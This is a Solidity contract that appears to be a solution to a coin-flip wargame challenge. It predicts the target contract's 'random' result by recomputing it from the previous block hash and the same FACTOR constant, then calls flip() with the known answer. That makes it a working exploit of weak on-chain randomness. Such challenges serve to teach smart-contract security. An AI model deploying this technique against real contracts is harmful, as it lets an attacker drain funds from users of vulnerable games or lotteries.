// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract SeeFlip {

  ICoinFlip public coinFlipContract;

  uint256 public result;
  uint256 public blockValue;
  uint256 public blockNumber;

  //uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _address) {
    coinFlipContract = ICoinFlip(_address);
  }

  function seeFlipNow() public  {
    blockNumber = block.number;
    blockValue = uint256(blockhash(block.number-1));
  
    result = blockValue / FACTOR;
    
    if (result == 1) {
      coinFlipContract.flip(true);
    } else {
      coinFlipContract.flip(false);
    }
  }

  function getBlocknumber () public view returns(uint256){
    return uint256(block.number);
  }
}